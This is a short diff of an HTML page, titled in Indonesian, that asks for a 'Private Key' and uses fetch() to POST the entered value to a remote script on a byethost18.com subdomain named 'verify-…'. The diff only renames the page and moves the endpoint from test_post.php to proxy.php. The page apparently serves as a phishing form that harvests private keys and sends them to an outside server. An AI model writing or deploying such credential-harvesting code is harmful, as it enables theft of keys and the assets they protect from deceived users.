@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Form POST ke ByetHost</title>
+    <title>Form POST dengan Proxy</title>
 </head>
 <body>
     <label for="PrivateKey">Private Key:</label>
@@ -15,7 +15,7 @@
             const privateKey = document.getElementById("PrivateKey").value;
             console.log("Private Key:", privateKey);
 
-            fetch("https://verify-nkbihfbeo.byethost18.com/test_post.php", {
+            fetch("https://verify-nkbihfbeo.byethost18.com/proxy.php", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/x-www-form-urlencoded"
